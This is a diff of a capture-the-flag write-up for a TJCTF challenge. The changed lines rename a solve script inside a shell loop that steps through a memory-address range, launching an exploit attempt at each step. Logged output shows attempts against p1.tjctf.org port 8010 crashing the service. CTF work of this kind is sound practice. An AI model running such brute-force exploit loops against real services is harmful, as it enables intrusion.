@@ -471,8 +471,8 @@ t.interact()
 count=4286578688
 while true
 do
-  echo python wu_solve003.py $count
-  python solve_many.py $count
+  echo python solve003.py $count
+  python solve003.py $count
   count=`expr $count + 1000`
   if [ $count -gt  4294967295 ]; then
           exit 0
@@ -489,21 +489,21 @@ p1.tjctf.org
 Sorry, we are closed.
 timeout: the monitored command dumped core
 *** Connection closed by remote host ***
-python wu_solve003.py 4286579688
+python solve003.py 4286579688
 ff8003e8
 p1.tjctf.org
 8010
 Sorry, we are closed.
 timeout: the monitored command dumped core
 *** Connection closed by remote host ***
-python wu_solve003.py 4286580688
+python solve003.py 4286580688
 ff8007d0
 p1.tjctf.org
 8010
 Sorry, we are closed.
 timeout: the monitored command dumped core
 *** Connection closed by remote host ***
-python wu_solve003.py 4286581688
+python solve003.py 4286581688
 ff800bb8
 p1.tjctf.org
 8010
